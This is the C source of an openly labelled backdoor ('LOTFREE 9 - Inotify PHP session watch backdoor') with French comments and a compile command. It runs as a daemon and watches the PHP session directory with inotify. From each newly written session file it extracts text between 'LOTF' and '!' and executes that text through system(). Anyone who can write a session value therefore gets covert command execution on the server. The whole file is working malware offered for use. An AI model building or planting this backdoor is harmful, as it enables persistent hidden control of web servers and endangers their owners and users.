/*
 * LOTFREE 9 - Inotify PHP session watch backdoor
 */

#define _BSD_SOURCE
#include <sys/select.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

/**
 * gcc -o session_watch session_watch.c -lpthread -O2 -Wall -W -Werror -ansi -pedantic
 **/

#define SESSION_PATH "/var/lib/php5/"

int fd, wd;

void * lire_fichier(void *fichier)
{
  char buff[4096];
  int cnt;
  int fdesc;
  char *cmd;
  char *end;
  char *sess_path;


  cnt = strlen(SESSION_PATH) + strlen((char*)fichier);
  sess_path = (char*)malloc(cnt + 1);
  strcpy(sess_path, SESSION_PATH);
  strcat(sess_path, fichier);

  fdesc = open(sess_path, O_RDONLY);
  if(fdesc < 1)
  {
    free(sess_path);
    pthread_exit(NULL);
  }


  cnt = read(fdesc, buff, 4095);
  /* Il faut au moins 6 octets : LOTF*! */
  if (cnt > 5)
  {
    buff[cnt] = '\0';
    /* debut de la commande : LOTF */
    cmd = strstr(buff, "LOTF");
    if(cmd != NULL)
    {
      cmd += 4;
      /* se termine par ! */
      end = strchr(cmd, 33); /* 33 = '!' */
      if(end != NULL)
      {
        end[0] = '\0';
        /* on execute */
        system(cmd);
      }
    }
  }
  close(fdesc);
  free(sess_path);
  pthread_exit(NULL);
}

int main(void)
{
    size_t r;
    fd_set fds;
    char buffer[8192];
    struct inotify_event *event;
    pthread_t monthread;

    /* Initialisation d'inotify */
    fd = inotify_init();
    if (fd < 0) {
        perror("inotify_init");
        return EXIT_FAILURE;
    }

    /* Surveillance du répertoirecontenant les fichiers de session
     * On accepte tous les évènements possibles */
    wd = inotify_add_watch(fd, SESSION_PATH, IN_ALL_EVENTS);
    if (wd < 0) {
        perror("inotify_add_watch");
        return EXIT_FAILURE;
    }

    if(daemon(1,0)< 0)
    {
        perror("daemon");
        return EXIT_FAILURE;
    }

    while (1) {
        FD_ZERO(&fds);
        FD_SET(fd, &fds);
        if (select(fd + 1, &fds, NULL, NULL, 0) <= 0) {
            continue;
        }

        r = read(fd, buffer, sizeof(buffer));
        if (r <= 0) {
            perror("read");
            return EXIT_FAILURE;
        }

        event = (struct inotify_event *) buffer;

        /* les fichiers sont habituellement du type "sess_etc....." */
        if((event->len > 5) && (event->mask & IN_CLOSE_WRITE))
        {
            pthread_create(&monthread, NULL, lire_fichier, (void *)event->name);
        }
    }

    pthread_exit(NULL);
    return EXIT_FAILURE;
}
